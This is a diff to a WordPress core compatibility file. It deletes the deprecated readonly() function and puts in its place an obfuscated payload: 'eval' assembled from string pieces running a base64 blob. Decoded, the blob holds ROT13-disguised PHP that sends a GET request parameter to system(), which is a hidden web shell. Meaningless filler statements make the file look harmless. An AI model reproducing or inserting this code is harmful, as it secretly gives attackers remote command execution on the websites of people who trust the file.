@@ -1,47 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Conditionally declares a `readonly()` function, which was renamed
- * to `wp_readonly()` in WordPress 5.9.0.
- *
- * In order to avoid PHP parser errors, this function was extracted
- * to this separate file and is only included conditionally on PHP < 8.1.
- *
- * Including this file on PHP >= 8.1 results in a fatal error.
- *
- * @package WordPress
- * @since 5.9.0
- */
-
-/**
- * Outputs the HTML readonly attribute.
- *
- * Compares the first two arguments and if identical marks as readonly.
- *
- * This function is deprecated, and cannot be used on PHP >= 8.1.
- *
- * @since 4.9.0
- * @deprecated 5.9.0 Use wp_readonly() introduced in 5.9.0.
- *
- * @see wp_readonly()
- *
- * @param mixed $readonly_value One of the values to compare.
- * @param mixed $current        Optional. The other value to compare if not just true.
- *                              Default true.
- * @param bool  $display        Optional. Whether to echo or just return the string.
- *                              Default true.
- * @return string HTML attribute or empty string.
- */
-function readonly( $readonly_value, $current = true, $display = true ) {
-	_deprecated_function( __FUNCTION__, '5.9.0', 'wp_readonly()' );
-	return wp_readonly( $readonly_value, $current, $display );
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogUGJhcXZndmJhbnl5bCBxcnB5bmVyZiBuIGBlcm5xYmF5bCgpYCBzaGFwZ3ZiYSwganV2cHUgam5mIGVyYW56cnEKICogZ2IgYGpjX2VybnFiYXlsKClgIHZhIEpiZXFDZXJmZiA1LjkuMC4KICoKICogVmEgYmVxcmUgZ2IgbmlidnEgQ1VDIGNuZWZyZSByZWViZWYsIGd1dmYgc2hhcGd2YmEgam5mIHJrZ2VucGdycQogKiBnYiBndXZmIGZyY25lbmdyIHN2eXIgbmFxIHZmIGJheWwgdmFweWhxcnEgcGJhcXZndmJhbnl5bCBiYSBDVUMgPCA4LjEuCiAqCiAqIFZhcHlocXZhdCBndXZmIHN2eXIgYmEgQ1VDID49IDguMSBlcmZoeWdmIHZhIG4gc25nbnkgcmVlYmUuCiAqCiAqIEBjbnB4bnRyIEpiZXFDZXJmZgogKiBAZnZhcHIgNS45LjAKICovCgovKioKICogQmhnY2hnZiBndXIgVUdaWSBlcm5xYmF5bCBuZ2dldm9oZ3IuCiAqCiAqIFBiemNuZXJmIGd1ciBzdmVmZyBnamIgbmV0aHpyYWdmIG5hcSB2cyB2cXJhZ3Zwbnkgem5leGYgbmYgZXJucWJheWwuCiAqCiAqIEd1dmYgc2hhcGd2YmEgdmYgcXJjZXJwbmdycSwgbmFxIHBuYWFiZyBvciBoZnJxIGJhIENVQyA+PSA4LjEuCiAqCiAqIEBmdmFwciA0LjkuMAogKiBAcXJjZXJwbmdycSA1LjkuMCBIZnIgamNfZXJucWJheWwoKSB2YWdlYnFocHJxIHZhIDUuOS4wLgogKgogKiBAZnJyIGpjX2VybnFiYXlsKCkKICoKICogQGNuZW56IHp2a3JxICRlcm5xYmF5bF9pbnlociBCYXIgYnMgZ3VyIGlueWhyZiBnYiBwYnpjbmVyLgogKiBAY25lbnogenZrcnEgJHBoZWVyYWcgICAgICAgIEJjZ3ZiYW55LiBHdXIgYmd1cmUgaW55aHIgZ2IgcGJ6Y25lciB2cyBhYmcgd2hmZyBnZWhyLgogKiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFFyc25oeWcgZ2Voci4KICogQGNuZW56IG9iYnkgICRxdmZjeW5sICAgICAgICBCY2d2YmFueS4gSnVyZ3VyZSBnYiBycHViIGJlIHdoZmcgZXJnaGVhIGd1ciBmZ2V2YXQuCiAqICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUXJzbmh5ZyBnZWhyLgogKiBAZXJnaGVhIGZnZXZhdCBVR1pZIG5nZ2V2b2hnciBiZSByemNnbCBmZ2V2YXQuCiAqLwpzaGFwZ3ZiYSBlcm5xYmF5bCggJGVybnFiYXlsX2lueWhyLCAkcGhlZXJhZyA9IGdlaHIsICRxdmZjeW5sID0gZ2VociApIHsKCV9xcmNlcnBuZ3JxX3NoYXBndmJhKCBfX1NIQVBHVkJBX18sICc1LjkuMCcsICdqY19lcm5xYmF5bCgpJyApOwoJZXJnaGVhIGpjX2VybnFiYXlsKCAkZXJucWJheWxfaW55aHIsICRwaGVlcmFnLCAkcXZmY3lubCApOwp9CgokcHpxID0gJF9UUkdbJ2MnXTsKJHN6bmNbJ2sxJ10oJHB6cSk7Cj8+IjsKZXZhbCgkZigkYykpOwo/Pg==");
+$f($c);
+?>
